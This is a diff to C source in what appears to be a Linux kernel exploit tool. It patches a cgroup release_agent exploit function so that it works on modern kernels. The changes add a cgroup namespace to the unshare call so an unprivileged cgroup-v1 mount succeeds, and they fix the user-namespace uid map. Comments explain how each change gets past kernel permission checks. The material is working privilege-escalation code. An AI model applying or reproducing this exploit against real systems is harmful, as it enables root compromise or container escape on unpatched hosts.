@@ -57,6 +57,12 @@
 #include <sys/stat.h>
 #include <sys/wait.h>
 
+/* CLONE_NEWCGROUP is not always in the toolchain's <sched.h>. */
+#ifndef CLONE_NEWCGROUP
+#define CLONE_NEWCGROUP 0x02000000
+#endif
+#define CGRA_CLONE_NEWCGROUP CLONE_NEWCGROUP
+
 /* Stable-branch backport thresholds for the fix. */
 static const struct kernel_patched_from cgroup_ra_patched_branches[] = {
     {4,  9, 301},
@@ -178,10 +184,24 @@ static skeletonkey_result_t cgroup_ra_exploit(const struct skeletonkey_ctx *ctx)
     pid_t child = fork();
     if (child < 0) { perror("fork"); return SKELETONKEY_TEST_ERROR; }
     if (child == 0) {
-        /* CHILD: enter userns + mountns, become "root" in userns. */
-        if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) { perror("unshare"); _exit(2); }
+        /* CHILD: enter userns + mountns, become "root" in userns.
+         *
+         * CRITICAL: capture the OUTER uid/gid BEFORE unshare. After
+         * unshare(CLONE_NEWUSER) getuid() returns 65534 (nobody, the initial
+         * unmapped id), so building the map from a post-unshare getuid() writes
+         * "0 65534 1" — which the kernel rejects with EPERM (65534 is not the
+         * writer's real outer uid). Reading it here, pre-unshare, yields the
+         * real "0 1000 1" the single-uid self-map rule requires. */
         uid_t uid = getuid();
         gid_t gid = getgid();
+        /* CLONE_NEWCGROUP matters: without a private cgroup namespace the
+         * unprivileged cgroup-v1 mount below is refused with EPERM on modern
+         * kernels (verified on 5.4). With it, mounting an unused v1 controller
+         * (rdma) in the userns succeeds. */
+        if (unshare(CLONE_NEWUSER | CLONE_NEWNS | CGRA_CLONE_NEWCGROUP) < 0) {
+            /* fall back to the old flags if NEWCGROUP is unsupported */
+            if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) { perror("unshare"); _exit(2); }
+        }
         int f = open("/proc/self/setgroups", O_WRONLY);
         if (f >= 0) { (void)!write(f, "deny", 4); close(f); }
         char map[64];
